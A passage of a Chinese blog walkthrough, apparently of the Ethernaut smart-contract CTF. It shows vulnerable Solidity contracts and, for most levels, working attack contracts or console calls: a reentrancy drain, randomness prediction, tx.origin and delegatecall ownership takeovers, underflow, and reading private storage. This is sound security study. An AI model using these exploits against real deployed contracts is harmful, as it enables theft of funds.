class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;<br><br>contract Fallout &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping (address =&gt; uint) allocations;<br>  address payable public owner;<br><br><br>  /* constructor */<br>  function Fal1out() public payable &#123;<br>    owner = msg.sender;<br>    allocations[owner] = msg.value;<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function allocate() public payable &#123;<br>    allocations[msg.sender] = allocations[msg.sender].add(msg.value);<br>  &#125;<br><br>  function sendAllocation(address payable allocator) public &#123;<br>    require(allocations[allocator] &gt; 0);<br>    allocator.transfer(allocations[allocator]);<br>  &#125;<br><br>  function collectAllocations() public onlyOwner &#123;<br>    msg.sender.transfer(address(this).balance);<br>  &#125;<br><br>  function allocatorBalance(address allocator) public view returns (uint) &#123;<br>    return allocations[allocator];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Fallout is Ownable &#123;...<br><br>function Fal1out() public payable &#123;...<br></code></pre></td></tr></table></figure><p>注意solidity版本为0.6，这意味着该合约的构造函数是由<code>function 合约名</code>实现的，而在此合约中作为构造函数其名称居然与合约名称不一致，使其成为了任何人都可以执行的公共函数</p><blockquote><p>在solidity 0.4.22版本及其之后中使用function声明构造函数的方法被舍弃，而采用了使用关键字constructor来声明构造函数。</p><blockquote><p>这是在使用编译器0.4.22之前的版本时所需注意的</p></blockquote></blockquote><p>参考：直接调用函数Fal1out</p><hr><h1 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h1><p>任务要求：连续猜对硬币的正反面十次。<del>区区千分之一的运气我也不是没有</del><br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract CoinFlip &#123;<br><br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor() &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题点：<br>硬币的正反面取决于上一个块，结果看起来是随机的但却是可预测的，但我们也可以通过获取上一个区块的信息来运行一次题目的算法然后选择对应的结果。因为在一个区块中的交易不止一个，所以只要保证在生成下一个区块前将完成操作即可。</p><p>然而，最优解是通过在另外一份合约，执行预测逻辑，获得对应结果后再调用coinflip完成目标。</p><p>参考：<br>获取实例地址<br>在remix上部署一份攻击合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  CoinFlip target;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor(address _target) &#123;<br>    target = CoinFlip(_target);<br>  &#125;<br><br>  function flip() public &#123;<br>    bool guess = _guess();<br>    target.flip(guess);<br>  &#125;<br><br>  function _guess() private view returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br>    return side;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后连续使用攻击合约的flip方法进行攻击10次就行</p><blockquote><p>知识点<br>SafeMath库：防溢出的增强型运算方法<br>block.num：当前区块数（需要添加一个与web3的链接<br>block.blockhash：区块哈希值</p></blockquote><hr><h1 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h1><p>任务要求：获取合约的所有权<br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Telephone &#123;<br><br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>  &#125;<br><br>  function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>本题涉及到tx.origin与msg.sender的区别：</p><blockquote><p>tx.origin是发起交易的账户<br>msg.sender是当前直接调用这个合约的即时账户</p></blockquote><p>例如：Alice通过调用合约A来调用合约B，合约A中与合约B中的tx.origin与msg.sender的情形如下：</p><table><thead><tr><th>Alice</th><th>-&gt;A</th><th>-&gt;B</th></tr></thead><tbody><tr><td>tx.origin</td><td>Alice</td><td>Alice</td></tr><tr><td>msg.sender</td><td>Alice</td><td>A</td></tr></tbody></table><p>如果情景是在一个合约下的调用，那么这两者是没有区别的；</p><h2 id="参考：在remix上部署另一个合约，通过该合约调用实例中的方法改变owner"><a href="#参考：在remix上部署另一个合约，通过该合约调用实例中的方法改变owner" class="headerlink" title="参考：在remix上部署另一个合约，通过该合约调用实例中的方法改变owner"></a>参考：在remix上部署另一个合约，通过该合约调用实例中的方法改变owner<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  constructor(address _addr) &#123;<br>    Telephone(_addr).changeOwner(msg.sender);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></h2><h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><p>任务要求：获取更多的Token<br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Token &#123;<br><br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) public &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br><br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br><br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br></code></pre></td></tr></table></figure><p>这里可以通过<em>下溢</em> 绕过require检测，因为_value和balance[]都为无符号整数，所以结果会变为2^256-1</p><p>参考：略</p><blockquote><p>solidity的0.6版本还没内置溢出检测，而在0.8及以后版本中当发生溢出后会进行revert。</p></blockquote><hr><h1 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h1><p>任务要求：获取合约的所有权<br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Delegate &#123;<br><br>  address public owner;<br><br>  constructor(address _owner) &#123;<br>    owner = _owner;<br>  &#125;<br><br>  function pwn() public &#123;<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br><br>contract Delegation &#123;<br><br>  address public owner;<br>  Delegate delegate;<br><br>  constructor(address _delegateAddress) &#123;<br>    delegate = Delegate(_delegateAddress);<br>    owner = msg.sender;<br>  &#125;<br><br>  fallback() external &#123;<br>    (bool result,) = address(delegate).delegatecall(msg.data);<br>    if (result) &#123;<br>      this;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：这题包含了两个合约Delegation和Delegate，Delegation合约实例化了Delegate合约，又在其Fallback函数中使用了delegatecall来调用了delegate合约。</p><blockquote><p>call函数是一个能对合约发送数据与合约进行交互的底层接口（它们都接受一个 bytes memory 参数，并返回成功条件（作为一个 bool） 和返回的数据（ bytes memory）。而delegatecall（委托调用）又与call有所不同：通过delegatecall调用的目标地址的代码要在当前合约的环境中执行。<br>这个函数主要是方便我们使用存在其他地方的函数——合约可以在运行时动态地从不同的地址加载代码。（用户必须确保两个合约中的存储结构都适合使用delegatecall。）</p></blockquote><p>解题点：<br><code>delegate.sol</code>合约中有一个公共的pwn函数，可以将owner更改为调用者。</p><p>而在<code>Delegation.sol</code>中，存储在slot0中的值恰好为我们要更改的目标——owner</p><p>因此只要我们通过调用Fallback函数，进行委托调用，更新owner。</p><p>解题参考：在控制台上直接调用<code>contract.sendTransaction(&#123;data:web3.utils.keccak256(&quot;pwn()&quot;).slice(0,10)&#125;)</code>，这表示向合约直接发送一个消息，接着能够直接进入Fallback函数中去。</p><p>或者直接获取实例地址，在Delegate合约中Ataddress，通过调用pwn方法也能够实现目标。但可能因为gas原因无法正常交易，提高燃料限制再进行交易</p><hr><h1 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h1><p>任务要求：让合约的balance大于0</p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Force &#123;/*<br><br>                   MEOW ?<br>         /\_/\   /<br>    ____/ o o \<br>  /~____  =ø= /<br> (______)__m_m)<br><br>*/&#125;<br></code></pre></td></tr></table></figure><p>解题点：<del>MEOW~（不是）</del></p><p>在以太坊中可以强制给一个合约发送以太，无论合约是否拒绝。通过函数selfdestruct来实现。</p><blockquote><p>这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送的资金会无视这一点。</p></blockquote><p>因此我们只需要创建一个合约往合约中存点eth然后调用selfdestruct发送给实例合约就行。</p><blockquote><p>在最新版本的solidity中selfdestruct已经被禁用了</p></blockquote><hr><h1 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h1><p>任务要求：将合约中的bool值改变</p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Vault &#123;<br>  bool public locked;<br>  bytes32 private password;<br><br>  constructor(bytes32 _password) &#123;<br>    locked = true;<br>    password = _password;<br>  &#125;<br><br>  function unlock(bytes32 _password) public &#123;<br>    if (password == _password) &#123;<br>      locked = false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题点：输入密码<del>废话</del></p><p>任何数据在区块链上都是透明的！（战术后仰）通过web3中的getStorageAt函数直接获取合约里的状态变量的值</p><blockquote><p><code>web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])</code><br>参数1：String 获取存储的地址；参数2：存储的索引位置；参数3：（可选）不使用web3.eth.defaultBlock设置的默认块，而是自定义或预定义的块号；参数4：（可选）可选回调，返回一个错误对象作为第一个参数，结果作为第二个参数<br>Returns ：返回给定位置的值</p><p>选自web3.<a href="https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#getstorageat">eth官方文档</a></p></blockquote><p>在控制台中输入<code>web3.eth.getStorageAt(InstenceAddress, 1)</code>，得到密码——因为在slot0中存储的是锁的状态，所以我们要的是slot1中的密码</p><p>接着，直接调用<code>contract.unlock(&quot;上面获得的数据&quot;)</code>就能通关了。</p><hr><h1 id="King"><a href="#King" class="headerlink" title="King"></a>King</h1><p>任务要求：确保王位</p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract King &#123;<br><br>  address king;<br>  uint public prize;<br>  address public owner;<br><br>  constructor() payable &#123;<br>    owner = msg.sender;  <br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt;= prize || msg.sender == owner);<br>    payable(king).transfer(msg.value);<br>    king = msg.sender;<br>    prize = msg.value;<br>  &#125;<br><br>  function _king() public view returns (address) &#123;<br>    return king;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题点：<code>payable(king).transfer(msg.value);</code></p><p>当新的国王诞生时将会给老国王原来的奖金，那么只要原来的国王不接受直接进行revert，那么就可以永远的占据合约的king</p><p>参考：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma ...<br><br>contract attack&#123;<br>  constructor (address _addr) public payable&#123;<br>    _addr.call&#123;gas:100000000,value:msg.value&#125;;<br>  &#125;<br><br>  // 可以通过不创建任何Fallback或receive方法，也可以通过如下方法<br>  receive() external payable &#123;<br>    revert();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h1><p>任务要求：盗取合约中的所有代币</p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.12;<br><br>import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;<br><br>contract Reentrance &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public balances;<br><br>  function donate(address _to) public payable &#123;<br>    balances[_to] = balances[_to].add(msg.value);<br>  &#125;<br><br>  function balanceOf(address _who) public view returns (uint balance) &#123;<br>    return balances[_who];<br>  &#125;<br><br>  function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>在整个合约中，只有这个函数才能将代币发送出去：他会接受一个输入，只要我们的余额大于等于指定的金额将会进行发送；然后更新余额。</p><p>因此这是个典型的重入攻击，我们在msg.sender.call()接受余额的同时执行我们的Fallback函数，在fallback中继续调用withdraw。</p><p>同时我们需要再某个时刻打破这个循环，否则会revert：首先可以获取目标合约的余额作为提取的最大金额，我们提取的金额最大为存入的金额，因此将其作为最小值。</p><p>在min(1e18,address(target).balance)中，我们每次获取目标的金额进行判断，在其未归零前都可以进行取款操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  Reentrance private target;<br>  constructor(address _target) &#123;<br>    target = Reentrance(_target);<br>  &#125;<br><br>  function attack() external payable &#123;<br>    target.donate&#123;value: 1e18&#125;(address(this));<br>    target.withdraw(1e18);<br>  &#125;<br><br>  receive() external payable &#123;<br>    uint amount = min(1e18,address(target).balance);<br>    if (amount &gt; 0) &#123;<br>      target.withdraw(amount);<br>    &#125;<br>  &#125;<br><br>  function min(uint x,uint y) private pure returns (uint) &#123;<br>    return x &lt;= y ? x : y;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>重入的关键：发送完成后才进行了sender的balances更新</p><hr><h1 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h1><p>这个电梯不让你到达顶楼，想办法到达顶楼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该题提供了一个接口Building，我们执行goTo()方法时，在Elevator合约中将在我们的地址上执行接口，接着该接口又会调用isLastFloor函数两次，为了执行判断内语句，第一次isLastFloor返回的结果要求False，接着第二次调用返回的结果需要是True。因此我们只需要实现一个能够在两次调用中实现相反输出的isLastFloor函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>    Elevator private target;<br>    bool private b = true;<br><br>    constructor (address _target) &#123;<br>      target = Elevator(_target);<br>    &#125;<br><br>    function isLastFloor(uint) external returns(bool) &#123;<br>        b = !b;<br>        return b;<br>    &#125;<br>    <br>    function pwn() public &#123;<br>        target.goTo(1); //输入的数并不最要<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h1><p>任务要求：解锁合约。</p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Privacy &#123;<br><br>  bool public locked = true;<br>  uint256 public ID = block.timestamp;<br>  uint8 private flattening = 10;<br>  uint8 private denomination = 255;<br>  uint16 private awkwardness = uint16(block.timestamp);<br>  bytes32[3] private data;<br><br>  constructor(bytes32[3] memory _data) &#123;<br>    data = _data;<br>  &#125;<br>  <br>  function unlock(bytes16 _key) public &#123;<br>    require(_key == bytes16(data[2]));<br>    locked = false;<br>  &#125;<br><br>  /*<br>    A bunch of super advanced solidity algorithms...<br><br>      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`<br>      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,<br>      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\<br>      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)<br>      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU<br>  */<br>&#125;<br></code></pre></td></tr></table></figure><p>合约部署需要一个包含3个<code>bytes32</code>元素的数组。而在solidity中是无法直接传递固定大小的数组，可以猜测实例是通过另一个合约协助部署的类似于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract PrivacyDeployer &#123;<br>    Privacy public privacyInstance;<br><br>    constructor() &#123;<br>        // Example data for _data parameter<br>        bytes32[3] memory data = [<br>            bytes32(&quot;Some data 1&quot;),<br>            bytes32(&quot;Some data 2&quot;),<br>            bytes32(&quot;Some data 3&quot;)<br>        ];<br>        <br>        privacyInstance = new Privacy(data);<br>    